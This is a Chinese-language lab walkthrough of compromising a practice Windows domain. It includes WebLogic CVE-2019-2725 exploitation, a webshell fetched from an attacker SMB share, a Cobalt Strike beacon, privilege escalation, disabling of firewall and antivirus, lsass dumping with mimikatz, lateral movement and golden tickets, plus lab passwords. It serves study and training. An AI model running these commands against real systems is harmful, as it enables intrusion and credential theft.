    • DC (10.10.10.10)域控
    • PC (10.10.10.201/192.168.111.129)

    • 开机密码：1qaz@WSX
    • web靶机C:\Oracle\Middleware\user_projects\domains\base_domain\bin下有一个startWeblogic的批处理，管理员身份运行它即可，web用户进入，关闭两个用户的360

    信息收集

    1. arp-scan -l
      nmap -sU –script nbstat.nse -p137 -T4 192.168.111.128/24
    2. 获得web(192.168.111.80)
      pc(192.168.111.129)
    3. nmap端口探测，有防火墙采用syn扫描
    4. 分析1433是sqlserver
          7001weblogic
    80网站
    3389
    445: SMB
    139：Samba
   通过扫描端口，我们通过端口初步判断目标机存在的服务及可能存在的漏洞，如445端口开放就意味着存smb服务，存在smb服务就可能存在ms17-010/端口溢出漏洞。开放139端口，就存在Samba服务，就可能存在爆破/未授权访问/远程命令执行漏洞。开放1433端口，就存在mssql服务，可能存在爆破/注入/SA弱口令。开放3389端口，就存在远程桌面。开放7001端口就存在weblogic。
    5. 下载https://github.com/rabbitmask/WeblogicScan
      └─# python3 WeblogicScan.py -u 192.168.111.80 -p 7001
      python3 WeblogicScan.py 192.168.111.80 7001

    [-] [192.168.21.152:7001] weblogic not detected CVE-2017-10271

    [-] [192.168.21.152:7001] weblogic not detected CVE-2017-3506

    [+] [192.168.21.152:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725

    [+] [192.168.21.152:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2729

    [-] [192.168.21.152:7001] weblogic not detected CVE-2019-2890

    1. 这里使用CVE-2019-2725(Weblogic反序列化漏洞)
      CVE-2019-2725 漏洞描述：这是一个 Weblogic 反序列化远程代码执行漏洞。部分版本 WebLogic 中默认包含的 wls9_async_response 包，为 WebLogic Server 提供异步通讯服务。由于 该 WAR 包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目 标服务器的权限，在未授权的情况下远程执行命令。
      CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根
      weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。
      打开msf，search cve-2019-2725
    2. 漏洞用msf用不了，360麻了，装个p得360，还好是老版360，只能换个思路
    3. 本地开启文件共享服务 impacket-smbserver share /root
      并将冰蝎马放在当前目录下
      📎weblogic_exp.txt
      bp发包到192.168.21.154
      返回202说明命令执行成功
      产生访问马
      http://192.168.111.80:7001/_async/1.jsp
      发现上传成功，冰蝎连接
      密码:rebeyond
    4. cs上木马，做个免杀，连上
    5. 360太烦了(我不会免杀)，关了
    6. shell CVE-2019-0803.exe cmd “start beacon.exe”利用漏洞提权，获得web服务器system权限
      📎CVE-2019-0803.zip.txt
      后缀名删掉解压即可
    7. shell netsh advfirewall set allprofiles state off关防火墙
    9. 横向移动
    10. mimikatz，转存哈希值
    11. shell net group “domain controllers” /domain 查找域控
      shell Nslookup -type=SRV _1dap._tcp
      ipconfig /all
    12. 使用 procdump64+mimikatz 获取 win 用户明文密码 beacon> shell procdump64.exe -accepteula -ma lsass.exe lsass.dmp -accepteula 参数：指定是否自动接受 Microsoft 软件许可条款。所有无人参与安装都需要此设 置。 -ma 参数：生成 full dump, 即包括进程的所有内存. 默认的 dump 格式包括线程和句柄信息.
    13. shell mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full” exit >pass.txt
    14. download pass.txt 查看密码
    15. ipconfig 查找域控
      shell net group “domain controllers” /domain 查看域控
      shell ping DC
      shell net group “domain admins” /domain 域管理员查看
    16. 横向移动，第一个，administrator 1qaz@WSX DE1ay
    17. 获得域控权限
    18. 关防火墙，dump哈希，mimikatz
    19. 黄金票据利用
      黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。
      黄金票据的条件要求：
      1.域名称
      2.域的SID值
      3.域的KRBTGT账户NTLM密码哈希
      4.伪造用户名
      黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。
      WEB机 Administrator 权限机器->右键->Access->Golden Ticket
